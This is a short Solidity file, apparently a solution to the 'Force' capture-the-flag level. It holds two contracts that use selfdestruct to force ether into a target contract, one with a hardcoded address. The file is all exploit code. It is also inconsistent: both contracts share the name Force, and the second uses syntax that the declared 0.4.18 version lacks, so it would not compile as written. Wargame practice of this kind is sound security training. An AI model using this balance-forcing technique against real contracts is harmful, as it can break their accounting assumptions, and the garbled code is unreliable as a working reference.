pragma solidity ^0.4.18;
 

contract Force {
    Force target = Force(0x580391b74a393A54ccbA42c8f2aF3f1B4aEcE0Ee);

    function give() public payable {
        selfdestruct(target);
    }
}

contract Force {
    constructor() payable {// 使用非0的value部署合约

    }
    function destruct(address payable addr) public  {
        selfdestruct(addr);
    }
}